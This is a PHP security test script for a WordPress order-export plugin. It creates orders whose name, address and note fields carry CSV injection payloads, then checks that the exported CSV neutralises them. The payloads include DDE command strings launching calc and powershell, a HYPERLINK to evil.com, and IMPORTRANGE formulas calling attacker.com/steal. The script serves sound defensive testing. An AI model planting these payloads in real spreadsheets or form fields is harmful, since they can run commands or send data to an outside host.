#!/usr/local/bin/php.cli
<?php
/**
 * Security Test: CSV Injection
 * Creates orders with formula-triggering characters in customer name, address,
 * and order notes. When opened in Excel, cells starting with = + - @ | can
 * execute formulas — the plugin MUST neutralise these.
 *
 * Run via SSH: /usr/local/bin/php.cli /path/to/tests/security/test-csv-injection.php
 */

if ( php_sapi_name() !== 'cli' ) { exit( 1 ); }

$wp_load = dirname( __FILE__, 3 ) . '/../../../wp-load.php';
if ( ! file_exists( $wp_load ) ) { echo "FATAL: wp-load.php not found.\n"; exit( 1 ); }
define( 'DOING_CRON', true );
require_once $wp_load;
require_once dirname( __DIR__ ) . '/lib/test-helpers.php';

echo "=== Security Test: CSV Injection Payloads ===" . PHP_EOL;

$payloads = [
    [
        'label' => 'A (=CMD in name)',
        'customer' => [
            'first' => "=CMD('calc')", 'last' => 'Injection',
            'addr1' => '1 Normal Street', 'addr2' => '', 'city' => 'London',
            'state' => '', 'postcode' => 'E1 1AA',
            'phone' => '07700 900040', 'email' => 'test-csv-a@example.com',
        ],
        'note' => '=HYPERLINK("http://evil.com","Click here")',
    ],
    [
        'label' => 'B (+cmd in address)',
        'customer' => [
            'first' => 'Normal', 'last' => 'Name',
            'addr1' => "+cmd|'/C calc'!A0", 'addr2' => '-2+3+cmd|/C calc!A0',
            'city' => 'Leeds', 'state' => 'West Yorkshire', 'postcode' => 'LS1 1AA',
            'phone' => '07700 900041', 'email' => 'test-csv-b@example.com',
        ],
        'note' => '+cmd|/C notepad!A0',
    ],
    [
        'label' => 'C (@SUM in name)',
        'customer' => [
            'first' => '@SUM(A1:A100)', 'last' => 'Formula',
            'addr1' => '|calc.exe', 'addr2' => '=1+1',
            'city' => 'Manchester', 'state' => 'Greater Manchester', 'postcode' => 'M1 1AA',
            'phone' => '07700 900042', 'email' => 'test-csv-c@example.com',
        ],
        'note' => '@SUM(A1:A10)',
    ],
    [
        'label' => 'D (IMPORTRANGE)',
        'customer' => [
            'first' => '=IMPORTRANGE("http://attacker.com/steal","A1")', 'last' => 'Import',
            'addr1' => '-2+3+cmd', 'addr2' => '=IF(1=1,"pwned","safe")',
            'city' => 'Birmingham', 'state' => 'West Midlands', 'postcode' => 'B1 1AA',
            'phone' => '07700 900043', 'email' => 'test-csv-d@example.com',
        ],
        'note' => '=IMPORTRANGE("http://attacker.com","Sheet1!A1")',
    ],
    [
        'label' => 'E (pipe and tab)',
        'customer' => [
            'first' => '|calc.exe', 'last' => "Pipe\tTab",
            'addr1' => "\t=1+1", 'addr2' => '',
            'city' => 'Bristol', 'state' => '', 'postcode' => 'BS1 1AA',
            'phone' => '07700 900044', 'email' => 'test-csv-e@example.com',
        ],
        'note' => '|powershell -c "malicious"',
    ],
];

$items = [
    [ 'id' => 15089, 'qty' => 1 ], // Siu Mai Dumplings — minimal order
];

$created = [];
foreach ( $payloads as $p ) {
    echo "  Order {$p['label']}..." . PHP_EOL;

    $order_id = mme_test_create_order( $p['customer'], $items, [ 'note' => $p['note'] ] );
    if ( $order_id ) {
        $created[] = $order_id;
        echo "    OK: Order #{$order_id}" . PHP_EOL;
    } else {
        echo "    FAILED" . PHP_EOL;
    }
}

echo PHP_EOL . "Created " . count( $created ) . "/5 orders. IDs: " . implode( ', ', $created ) . PHP_EOL;
echo PHP_EOL . "CRITICAL CHECKS after export:" . PHP_EOL;
echo "  1. Open the CSV in a TEXT editor (not Excel) and check no raw = + - @ | at start of fields" . PHP_EOL;
echo "  2. Open the CSV in Excel and verify no formula execution warning" . PHP_EOL;
echo "  3. All injection payloads should appear as literal text, not formulas" . PHP_EOL;
echo "  4. Check the plugin's sanitisation: fields should be prefixed with ' or tab, or stripped" . PHP_EOL;
